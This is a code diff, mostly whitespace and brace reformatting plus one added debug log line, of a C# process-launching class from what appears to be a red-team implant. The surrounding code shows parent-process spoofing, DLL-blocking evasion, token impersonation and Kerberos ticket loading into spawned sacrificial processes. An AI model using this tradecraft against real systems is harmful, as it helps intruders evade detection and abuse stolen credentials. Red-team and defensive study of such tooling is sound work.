@@ -80,25 +80,25 @@ namespace Process
             out Win32.ProcessInformation lpProcessInformation
         );
         private delegate bool CreateProcessWithLogonW(
-            [MarshalAs(UnmanagedType.LPWStr)]String lpUsername,
-            [MarshalAs(UnmanagedType.LPWStr)]String lpDomain,
-            [MarshalAs(UnmanagedType.LPWStr)]String lpPassword,
+            [MarshalAs(UnmanagedType.LPWStr)] String lpUsername,
+            [MarshalAs(UnmanagedType.LPWStr)] String lpDomain,
+            [MarshalAs(UnmanagedType.LPWStr)] String lpPassword,
             LogonFlags dwLogonFlags,
-            [MarshalAs(UnmanagedType.LPWStr)]String lpApplicationName,
-            [MarshalAs(UnmanagedType.LPWStr)]String lpCommandLine,
+            [MarshalAs(UnmanagedType.LPWStr)] String lpApplicationName,
+            [MarshalAs(UnmanagedType.LPWStr)] String lpCommandLine,
             CreateProcessFlags dwCreationFlags,
             IntPtr lpEnvironment,
-            [MarshalAs(UnmanagedType.LPWStr)]String lpCurrentDirectory,
+            [MarshalAs(UnmanagedType.LPWStr)] String lpCurrentDirectory,
             [In] ref StartupInfoEx lpStartupInfo,
             out Win32.ProcessInformation lpProcessInformation);
         private delegate bool CreateProcessWithTokenW(
             IntPtr hToken,
             LogonFlags dwLogonFlags,
-            [MarshalAs(UnmanagedType.LPWStr)]String lpApplicationName,
-            [MarshalAs(UnmanagedType.LPWStr)]String lpCommandLine,
+            [MarshalAs(UnmanagedType.LPWStr)] String lpApplicationName,
+            [MarshalAs(UnmanagedType.LPWStr)] String lpCommandLine,
             CreateProcessFlags dwCreationFlags,
             IntPtr lpEnvironment,
-            [MarshalAs(UnmanagedType.LPWStr)]String lpCurrentDirectory,
+            [MarshalAs(UnmanagedType.LPWStr)] String lpCurrentDirectory,
             [In] ref StartupInfoEx lpStartupInfo,
             out Win32.ProcessInformation lpProcessInformation);
         #endregion
@@ -208,7 +208,7 @@ namespace Process
             _pCreateProcessWithTokenW = _agent.GetApi().GetLibraryFunction<CreateProcessWithTokenW>(Library.ADVAPI32, "CreateProcessWithTokenW");
             ImpersonateLoggedOnUserDelegate = _agent.GetApi().GetLibraryFunction<Advapi32APIs.ImpersonateLoggedOnUser>(Library.ADVAPI32, "ImpersonateLoggedOnUser");
 
-            #if SERVER2012_COMPATIBLE
+#if SERVER2012_COMPATIBLE
             _pGetModuleHandleA = _agent.GetApi().GetLibraryFunction<GetModuleHandleA>(Library.KERNEL32, "GetModuleHandleA");
             _pGetProcAddress = _agent.GetApi().GetLibraryFunction<GetProcAddress>(Library.KERNEL32, "GetProcAddress");
 
@@ -231,12 +231,12 @@ namespace Process
             
             _pUpdateProcThreadAttribute = (UpdateProcThreadAttribute)Marshal.GetDelegateForFunctionPointer(pUpdateProcThreadAttribute, typeof(UpdateProcThreadAttribute));
             _pDeleteProcThreadAttributeList = (DeleteProcThreadAttributeList)Marshal.GetDelegateForFunctionPointer(pDeleteProcThreadAttributeList, typeof(DeleteProcThreadAttributeList));
-            #else
+#else
             _pSetHandleInformation = _agent.GetApi().GetLibraryFunction<SetHandleInformation>(Library.KERNEL32, "SetHandleInformation");
             _pInitializeProcThreadAttributeList = _agent.GetApi().GetLibraryFunction<InitializeProcThreadAttributeList>(Library.KERNEL32, "InitializeProcThreadAttributeList");
             _pUpdateProcThreadAttribute = _agent.GetApi().GetLibraryFunction<UpdateProcThreadAttribute>(Library.KERNEL32, "UpdateProcThreadAttribute");
             _pDeleteProcThreadAttributeList = _agent.GetApi().GetLibraryFunction<DeleteProcThreadAttributeList>(Library.KERNEL32, "DeleteProcThreadAttributeList");
-            #endif
+#endif
 
             _pCreateProcessA = _agent.GetApi().GetLibraryFunction<CreateProcessA>(Library.KERNEL32, "CreateProcessA");
             _pCreatePipe = _agent.GetApi().GetLibraryFunction<CreatePipe>(Library.KERNEL32, "CreatePipe");
@@ -263,7 +263,7 @@ namespace Process
 
             if (_unmanagedEnv != IntPtr.Zero)
             {
-                _pDestroyEnvironmentBlock(_unmanagedEnv);   
+                _pDestroyEnvironmentBlock(_unmanagedEnv);
             }
 
             if (Handle != IntPtr.Zero)
@@ -292,7 +292,14 @@ namespace Process
             try
             {
                 System.Diagnostics.Process.GetProcessById((int)PID).Kill();
-            } catch { }
+            }
+            catch { }
+
+            if (ExitCode != 0)
+            {
+                DebugHelp.DebugWriteLine($"Sacrificial process exited with code 0x{ExitCode:x}");
+            }
+
             _exited.Set();
         }
 
@@ -327,7 +334,7 @@ namespace Process
 
                 Marshal.WriteIntPtr(lpVal, _hParentProc);
                 int dwAttributeCount = evasionArgs.BlockDLLs ? 2 : 1;
-                
+
                 var result1 = _pInitializeProcThreadAttributeList(IntPtr.Zero, dwAttributeCount, 0, ref lpSize);
                 _startupInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                 DebugHelp.DebugWriteLine("Initializing proc thread attribute list");
@@ -341,7 +348,7 @@ namespace Process
                         bRet = EnableBlockDLLs();
                     }
                     DebugHelp.DebugWriteLine("Setting parent process");
-                    bRet = _pUpdateProcThreadAttribute( _startupInfoEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpVal, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
+                    bRet = _pUpdateProcThreadAttribute(_startupInfoEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpVal, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
                     if (bRet)
                     {
                         try
@@ -442,7 +449,7 @@ namespace Process
         private ApplicationStartupInfo GetSafeStartupArgs()
         {
             var evasionArgs = _agent.GetProcessManager().GetStartupInfo();
-            
+
             // bad things happen if you're medium integrity and do ppid spoofing while under the effects of make_token
             if (_agent.GetIdentityManager().GetOriginal().Name != _agent.GetIdentityManager().GetCurrentPrimaryIdentity().Name)
             {
@@ -515,7 +522,7 @@ namespace Process
         {
             bool bRet = false;
             if (_agent.GetIdentityManager().IsOriginalIdentity())
-            {           
+            {
                 bRet = InitializeStartupEnvironment(_agent.GetIdentityManager().GetCurrentPrimaryIdentity().Token);
                 if (bRet)
                 {
@@ -529,7 +536,7 @@ namespace Process
                         _unmanagedEnv,
                         null,
                         ref _startupInfoEx,
-                        out _processInfo);   
+                        out _processInfo);
                 }
             }
             else
@@ -574,9 +581,12 @@ namespace Process
                 try
                 {
                     waitExitForever.Wait(_cts.Token);
-                } catch (OperationCanceledException) {
-                    
-                } finally
+                }
+                catch (OperationCanceledException)
+                {
+
+                }
+                finally
                 {
                     OnExit(this, null);
                 }
@@ -764,10 +774,6 @@ namespace Process
                     throw new Win32Exception(dwError);
                 }
 
-                
-                
-                
-
                 PostStartupInitialize();
                 if (PID == 0)
                 {
@@ -779,17 +785,17 @@ namespace Process
                     DebugHelp.DebugWriteLine($"LUID prior to impersonation: {_agent.GetTicketManager().GetCurrentLuid()}");
                     //get into the context of the newly created process prior to loading tickets
                     IntPtr targetProcessHandle = _pOpenProcess(ProcessAccessFlags.MAXIMUM_ALLOWED, false, (int)PID);
-                    if(targetProcessHandle == IntPtr.Zero)
+                    if (targetProcessHandle == IntPtr.Zero)
                     {
                         DebugHelp.DebugWriteLine("Failed to open process handle");
                     }
                     bool OpenedTargetToken = OpenProcessTokenDelegate((APIInteropTypes.HANDLE)targetProcessHandle, TokenAccessLevels.Query | TokenAccessLevels.Duplicate, out APIInteropTypes.HANDLE targetProcessTokenHandle);
-                    if(OpenedTargetToken is false)
+                    if (OpenedTargetToken is false)
                     {
                         DebugHelp.DebugWriteLine("Failed to open process token handle");
                         DebugHelp.DebugWriteLine("Error code: " + Marshal.GetLastWin32Error());
                     }
-                    if(targetProcessTokenHandle.IsNull)
+                    if (targetProcessTokenHandle.IsNull)
                     {
                         DebugHelp.DebugWriteLine("opened token but handle is null");
                         DebugHelp.DebugWriteLine("Error code: " + Marshal.GetLastWin32Error());
